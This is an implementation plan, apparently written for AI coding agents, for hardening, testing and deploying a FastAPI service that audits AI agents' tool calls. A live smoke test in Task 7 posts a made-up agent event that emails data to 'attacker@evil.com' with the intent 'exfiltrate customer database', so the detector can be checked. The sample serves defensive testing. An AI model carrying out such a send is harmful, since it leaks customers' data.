# Plan 5 — Hardening, CI & Live Deploy

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development or
> superpowers:executing-plans. Steps use checkbox (`- [ ]`) syntax. Use
> superpowers:verification-before-completion for the live-deploy steps — evidence before claims.

**Goal:** Make the service production-safe (health/readiness, locked CORS, rate limiting,
structured + redacted logging), give it reproducible CI (Postgres service) and deploy configs
(`render.yaml`, `vercel.json`), and take it fully live end-to-end.

**Architecture:** FastAPI gains `/health` (liveness) + `/ready` (DB ping), CORS restricted to
the Vercel origin via env, and slowapi rate limits on the write/expensive paths. CI runs the
full pytest suite against a Postgres service container plus the frontend build/tests. Render runs
the API container; Vercel runs the frontend; Supabase holds Postgres+Auth.

**Tech Stack:** slowapi, FastAPI, GitHub Actions, Render, Vercel, Supabase.

**Depends on:** Plans 1–4.

---

### Task 1: Health + readiness endpoints

**Files:**
- Modify: `blackbox/ingest.py`
- Test: `tests/test_health.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_health.py`:
```python
import os
os.environ.setdefault("DATABASE_URL",
    os.environ.get("TEST_DATABASE_URL", "postgresql://localhost:5432/blackbox_test"))
os.environ.setdefault("SUPABASE_JWT_SECRET", "test-secret")
os.environ.setdefault("BLACKBOX_SECRET_KEY", "8sJ8m1bXh2pT0v9w3yQ5rZ6kN4lP7cA1dE2fG3hI4k=")
from fastapi.testclient import TestClient

def test_health_is_public_and_ok():
    from blackbox.ingest import app
    c = TestClient(app)
    assert c.get("/health").json() == {"status": "ok"}

def test_ready_checks_db():
    from blackbox.ingest import app
    from blackbox.migrate import apply_migrations
    apply_migrations()
    c = TestClient(app)
    r = c.get("/ready")
    assert r.status_code == 200 and r.json()["db"] is True
```

- [ ] **Step 2: Run to verify fail**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_health.py -v`
Expected: FAIL (no `/health` route)

- [ ] **Step 3: Implement**

In `blackbox/ingest.py`, add (no auth on these):
```python
@app.get("/health")
def health() -> dict:
    return {"status": "ok"}

@app.get("/ready")
def ready():
    from fastapi import Response
    try:
        with store.pool.connection() as conn, conn.cursor() as cur:
            cur.execute("SELECT 1")
            cur.fetchone()
        return {"db": True}
    except Exception:
        return Response(content='{"db": false}', media_type="application/json", status_code=503)
```

- [ ] **Step 4: Run to verify pass + commit**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_health.py -v`
Expected: PASS
```bash
git add blackbox/ingest.py tests/test_health.py
git commit -m "feat: /health liveness + /ready DB-ping readiness endpoints"
```

---

### Task 2: Lock CORS to the frontend origin

**Files:**
- Modify: `blackbox/ingest.py`
- Test: `tests/test_cors.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_cors.py`:
```python
import os
os.environ["FRONTEND_ORIGIN"] = "https://blackbox.vercel.app"
os.environ.setdefault("DATABASE_URL",
    os.environ.get("TEST_DATABASE_URL", "postgresql://localhost:5432/blackbox_test"))
os.environ.setdefault("SUPABASE_JWT_SECRET", "test-secret")
os.environ.setdefault("BLACKBOX_SECRET_KEY", "8sJ8m1bXh2pT0v9w3yQ5rZ6kN4lP7cA1dE2fG3hI4k=")

def test_cors_allows_configured_origin_only():
    import importlib, blackbox.ingest as ing
    importlib.reload(ing)
    from fastapi.testclient import TestClient
    c = TestClient(ing.app)
    good = c.get("/health", headers={"Origin": "https://blackbox.vercel.app"})
    assert good.headers.get("access-control-allow-origin") == "https://blackbox.vercel.app"
```

- [ ] **Step 2: Run to verify fail**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_cors.py -v`
Expected: FAIL (CORS currently `allow_origins=["*"]`, so the echoed origin is `*`)

- [ ] **Step 3: Implement**

In `blackbox/ingest.py`, replace the CORS middleware block:
```python
_origins = [o for o in os.environ.get("FRONTEND_ORIGIN", "").split(",") if o] or ["*"]
app.add_middleware(CORSMiddleware, allow_origins=_origins,
                   allow_methods=["*"], allow_headers=["*"], allow_credentials=True)
```
(Local dev with `FRONTEND_ORIGIN` unset keeps `*`; production sets the Vercel origin.)

- [ ] **Step 4: Run to verify pass + commit**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_cors.py -v`
Expected: PASS
```bash
git add blackbox/ingest.py tests/test_cors.py
git commit -m "feat: restrict CORS to FRONTEND_ORIGIN in production"
```

---

### Task 3: Rate-limit the write/expensive paths

**Files:**
- Modify: `pyproject.toml`, `requirements.txt`
- Modify: `blackbox/ingest.py`
- Test: `tests/test_rate_limit.py`

- [ ] **Step 1: Add slowapi**

`pyproject.toml` dependencies + `requirements.txt`, add:
```
slowapi>=0.1.9
```
Install: `pip install -e ".[dev]"`

- [ ] **Step 2: Write the failing test**

Create `tests/test_rate_limit.py`:
```python
import os
os.environ.setdefault("DATABASE_URL",
    os.environ.get("TEST_DATABASE_URL", "postgresql://localhost:5432/blackbox_test"))
os.environ.setdefault("SUPABASE_JWT_SECRET", "test-secret")
os.environ.setdefault("BLACKBOX_SECRET_KEY", "8sJ8m1bXh2pT0v9w3yQ5rZ6kN4lP7cA1dE2fG3hI4k=")
os.environ["EVENTS_RATE_LIMIT"] = "3/minute"
import importlib, blackbox.ingest as ing
importlib.reload(ing)
from fastapi.testclient import TestClient
from blackbox.migrate import apply_migrations
from blackbox.orgs import create_org
from blackbox.apikeys import create_api_key
from blackbox.db import get_pool

def _clean():
    apply_migrations()
    with get_pool().connection() as conn, conn.cursor() as cur:
        cur.execute("TRUNCATE events, verdicts, api_keys, byok_secrets, org_members, orgs RESTART IDENTITY CASCADE")
        conn.commit()

def test_events_rate_limited():
    _clean()
    org = create_org("Acme", "u1"); key = create_api_key(org, "ci")
    c = TestClient(ing.app)
    h = {"Authorization": f"Bearer {key}"}
    ev = {"agent_id": "a", "session_id": "s", "kind": "tool_call", "tool": "t", "args": {}, "intent": "i"}
    codes = [c.post("/events", json=ev, headers=h).status_code for _ in range(5)]
    assert 429 in codes   # the limiter trips within the window
```

- [ ] **Step 3: Run to verify fail**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest tests/test_rate_limit.py -v`
Expected: FAIL (no limiter; all return 200)

- [ ] **Step 4: Implement**

In `blackbox/ingest.py`, near the top after `app = FastAPI(...)`:
```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

EVENTS_RATE_LIMIT = os.environ.get("EVENTS_RATE_LIMIT", "120/minute")
AUDIT_RATE_LIMIT = os.environ.get("AUDIT_RATE_LIMIT", "20/minute")
```
Decorate the two paths (slowapi requires the `request: Request` param):
```python
from fastapi import Request

@app.post("/events")
@limiter.limit(EVENTS_RATE_LIMIT)
def ingest(request: Request, e: Event, org_id: str = Depends(org_from_api_key)) -> Event:
    return store.append(org_id, e)
```
And on audit:
```python
@app.post("/audit/{session_id}")
@limiter.limit(AUDIT_RATE_LIMIT)
def audit_session(request: Request, session_id: str, org_id: str = Depends(current_org)) -> list[Verdict]:
    api_key = get_byok(org_id, "anthropic")
    return audited_run(store, org_id, session_id, _pack, api_key)
```

- [ ] **Step 5: Run to verify pass + full suite + commit**

Run: `DATABASE_URL="${TEST_DATABASE_URL}" pytest -v`
Expected: PASS
```bash
git add pyproject.toml requirements.txt blackbox/ingest.py tests/test_rate_limit.py
git commit -m "feat: rate-limit /events and /audit (slowapi, env-configurable)"
```

---

### Task 4: Structured logging + redaction wired at startup

**Files:**
- Create: `blackbox/logging_config.py`
- Modify: `blackbox/ingest.py`
- Test: `tests/test_logging_config.py`

- [ ] **Step 1: Write the failing test**

Create `tests/test_logging_config.py`:
```python
import logging
from blackbox.logging_config import configure_logging
from blackbox.logging_filter import SecretRedactionFilter

def test_configure_logging_installs_redaction():
    configure_logging()
    root = logging.getLogger()
    has_filter = any(isinstance(f, SecretRedactionFilter) for f in root.filters) or \
                 any(any(isinstance(f, SecretRedactionFilter) for f in h.filters) for h in root.handlers)
    assert has_filter
```

- [ ] **Step 2: Run to verify fail**

Run: `pytest tests/test_logging_config.py -v`
Expected: FAIL (`ModuleNotFoundError`)

- [ ] **Step 3: Implement**

Create `blackbox/logging_config.py`:
```python
# blackbox/blackbox/logging_config.py
import logging, json
from .logging_filter import install_redaction

class JsonFormatter(logging.Formatter):
    def format(self, record: logging.LogRecord) -> str:
        payload = {"level": record.levelname, "logger": record.name,
                   "msg": record.getMessage()}
        return json.dumps(payload, ensure_ascii=False)

def configure_logging() -> None:
    root = logging.getLogger()
    root.setLevel(logging.INFO)
    if not root.handlers:
        h = logging.StreamHandler()
        h.setFormatter(JsonFormatter())
        root.addHandler(h)
    install_redaction()   # redaction runs AFTER handlers exist so they inherit the filter
```
In `blackbox/ingest.py`, replace the bare `install_redaction()` call (from Plan 3) with:
```python
from .logging_config import configure_logging
configure_logging()
```

- [ ] **Step 4: Run to verify pass + commit**

Run: `pytest tests/test_logging_config.py -v`
Expected: PASS
```bash
git add blackbox/logging_config.py blackbox/ingest.py tests/test_logging_config.py
git commit -m "feat: structured JSON logging with secret redaction at startup"
```

---

### Task 5: CI with a Postgres service + frontend build

**Files:**
- Rewrite: `.github/workflows/ci.yml`

- [ ] **Step 1: Write the workflow**

Rewrite `.github/workflows/ci.yml`:
```yaml
name: CI
on: [push, pull_request]

jobs:
  backend:
    runs-on: ubuntu-latest
    services:
      postgres:
        image: postgres:15
        env:
          POSTGRES_PASSWORD: postgres
          POSTGRES_DB: blackbox_test
        ports: ["5432:5432"]
        options: >-
          --health-cmd "pg_isready -U postgres" --health-interval 5s
          --health-timeout 5s --health-retries 10
    env:
      TEST_DATABASE_URL: postgresql://postgres:postgres@localhost:5432/blackbox_test
      DATABASE_URL: postgresql://postgres:postgres@localhost:5432/blackbox_test
      SUPABASE_JWT_SECRET: test-secret
      BLACKBOX_SECRET_KEY: 8sJ8m1bXh2pT0v9w3yQ5rZ6kN4lP7cA1dE2fG3hI4k=
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with: { python-version: "3.11" }
      - run: pip install -e ".[dev]"
      - run: pytest -v

  frontend:
    runs-on: ubuntu-latest
    defaults: { run: { working-directory: frontend } }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: "20" }
      - run: npm ci
      - run: npm test
      - run: npm run build
        env:
          NEXT_PUBLIC_SUPABASE_URL: https://example.supabase.co
          NEXT_PUBLIC_SUPABASE_ANON_KEY: build-time-placeholder
          NEXT_PUBLIC_API_URL: https://api.example.com
```

- [ ] **Step 2: Commit + push, watch CI**

```bash
git add .github/workflows/ci.yml
git commit -m "ci: Postgres service + full pytest suite + frontend build/test"
git push
gh run watch
```
Expected: both jobs green. Fix any failure before proceeding.

---

### Task 6: Deploy configs

**Files:**
- Create: `render.yaml`
- Create: `frontend/vercel.json`
- Create: `.env.example`
- Rewrite: `DEPLOY.md`
- Modify: `Dockerfile` (ensure it installs the package so `psycopg`/`slowapi`/`cryptography` are present)

- [ ] **Step 1: render.yaml (API)**

Create `render.yaml`:
```yaml
services:
  - type: web
    name: blackbox-api
    runtime: docker
    dockerfilePath: ./Dockerfile
    healthCheckPath: /health
    envVars:
      - key: DATABASE_URL          # Supabase transaction pooler URL (port 6543)
        sync: false
      - key: SUPABASE_JWT_SECRET
        sync: false
      - key: BLACKBOX_SECRET_KEY   # Fernet key: python -c "from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())"
        sync: false
      - key: FRONTEND_ORIGIN       # https://<your-app>.vercel.app
        sync: false
```

- [ ] **Step 2: vercel.json (frontend)**

Create `frontend/vercel.json`:
```json
{
  "buildCommand": "npm run build",
  "framework": "nextjs"
}
```
(Set `NEXT_PUBLIC_SUPABASE_URL`, `NEXT_PUBLIC_SUPABASE_ANON_KEY`, `NEXT_PUBLIC_API_URL` in the
Vercel dashboard env settings — never commit them.)

- [ ] **Step 3: .env.example**

Create `.env.example`:
```
# API (Render)
DATABASE_URL=postgresql://postgres:<pwd>@<host>:6543/postgres   # Supabase transaction pooler
SUPABASE_JWT_SECRET=<from Supabase: Project Settings > API > JWT secret>
BLACKBOX_SECRET_KEY=<python -c "from cryptography.fernet import Fernet;print(Fernet.generate_key().decode())">
FRONTEND_ORIGIN=https://<your-app>.vercel.app
EVENTS_RATE_LIMIT=120/minute
AUDIT_RATE_LIMIT=20/minute

# Frontend (Vercel)
NEXT_PUBLIC_SUPABASE_URL=https://<project>.supabase.co
NEXT_PUBLIC_SUPABASE_ANON_KEY=<anon key>
NEXT_PUBLIC_API_URL=https://blackbox-api.onrender.com
```

- [ ] **Step 4: Rewrite DEPLOY.md**

Rewrite `DEPLOY.md` to document the live three-service topology end to end:
1. **Supabase:** create project → run `migrations/*.sql` (SQL editor or `apply_migrations()` with
   `DATABASE_URL` set) → copy the JWT secret + the **transaction pooler** connection string (port
   6543) → enable email auth.
2. **Render:** New Web Service → Docker → set the four env vars from `render.yaml` → deploy →
   note the `…onrender.com` URL → confirm `GET /health` returns `{"status":"ok"}`.
3. **Vercel:** import `frontend/` → set the three `NEXT_PUBLIC_*` env vars (API URL = the Render
   URL) → deploy → note the `…vercel.app` URL.
4. **Close the loop:** set `FRONTEND_ORIGIN` on Render to the Vercel URL → redeploy API.

- [ ] **Step 5: Commit**

```bash
git add render.yaml frontend/vercel.json .env.example DEPLOY.md Dockerfile
git commit -m "chore: Render + Vercel deploy configs, .env.example, refreshed DEPLOY.md"
git push
```

---

### Task 7: Go live + end-to-end verification

> Requires the user's Supabase/Render/Vercel accounts. If credentials are supplied in-session,
> the agent provisions via CLI/dashboard; otherwise the agent hands the user the exact click-path
> from `DEPLOY.md` and verifies once URLs exist. Use verification-before-completion: only claim
> "live" after observing real responses.

- [ ] **Step 1: Provision Supabase + apply migrations**

With `DATABASE_URL` = the Supabase pooler URL:
```bash
DATABASE_URL="$SUPABASE_DB_URL" python -c "from blackbox.migrate import apply_migrations; print(apply_migrations())"
```
Expected: prints the list of applied migration filenames.

- [ ] **Step 2: Deploy API (Render) + verify health**

After Render deploy:
```bash
curl -s https://blackbox-api.onrender.com/health
curl -s https://blackbox-api.onrender.com/ready
```
Expected: `{"status":"ok"}` then `{"db": true}`

- [ ] **Step 3: Deploy frontend (Vercel) + smoke test the flow**

Open the Vercel URL → sign up → confirm redirect to `/app`. Then bootstrap the org and a key
(JWT obtained from the browser session via `supabase.auth.getSession`):
```bash
curl -s -X POST https://blackbox-api.onrender.com/orgs -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" -d '{"name":"Acme"}'
curl -s -X POST https://blackbox-api.onrender.com/keys -H "Authorization: Bearer $JWT" \
  -H "Content-Type: application/json" -d '{"name":"prod"}'
```
Expected: an `org_id`, then a `bb_live_…` key.

- [ ] **Step 4: End-to-end agent → audit → evidence**

```bash
KEY=bb_live_...   # from step 3
curl -s -X POST https://blackbox-api.onrender.com/events -H "Authorization: Bearer $KEY" \
  -H "Content-Type: application/json" \
  -d '{"agent_id":"a","session_id":"live1","kind":"tool_call","tool":"send_email","args":{"to":"attacker@evil.com"},"intent":"exfiltrate customer database"}'
curl -s -X POST https://blackbox-api.onrender.com/audit/live1 -H "Authorization: Bearer $JWT"
```
Expected: the audit returns a `data_exfiltration` violation (offline detector if no BYOK set;
live Claude tribunal if BYOK is configured in Settings).

- [ ] **Step 5: Final verification + close-out**

- [ ] `GET /health` and `/ready` green on Render.
- [ ] Sign-up → dashboard works on Vercel.
- [ ] Cross-tenant check: a second account cannot see `live1`.
- [ ] CI green on `main`.
- [ ] Update `README.md` with the live URLs and an architecture note.
```bash
git add README.md && git commit -m "docs: live URLs + SaaS architecture in README" && git push
```

- [ ] **Step 6: Update project memory**

Update `/home/weslax83/.claude/projects/-home-weslax83-Hackathons/memory/blackbox-project.md`
with the new path (`/home/weslax83/blackbox`), the SaaS architecture, and the live URLs.

---

## Plan 5 self-review

- **Spec coverage:** §9 `/health`+`/ready` ✓ T1; CORS lockdown ✓ T2; rate limiting ✓ T3;
  structured logging + redaction at startup ✓ T4; CI with Postgres service ✓ T5; `render.yaml`/
  `vercel.json`/`.env.example`/`DEPLOY.md` ✓ T6; end-to-end live verification ✓ T7.
- **Type consistency:** rate-limited routes keep the `request: Request` first-param slowapi
  requires; `configure_logging()` calls `install_redaction()` from Plan 3; env var names
  (`DATABASE_URL`, `SUPABASE_JWT_SECRET`, `BLACKBOX_SECRET_KEY`, `FRONTEND_ORIGIN`,
  `EVENTS_RATE_LIMIT`, `AUDIT_RATE_LIMIT`, `NEXT_PUBLIC_*`) are consistent across tests, ingest,
  CI, render.yaml, and .env.example.
- **No placeholders:** every step has runnable code/commands and expected output. T7 live steps
  are gated on user-owned credentials, with an explicit fallback (hand over the DEPLOY.md
  click-path) — not a silent skip.
- **Verification discipline:** T7 requires observing real `/health`, `/ready`, audit, and
  cross-tenant responses before declaring the product live.
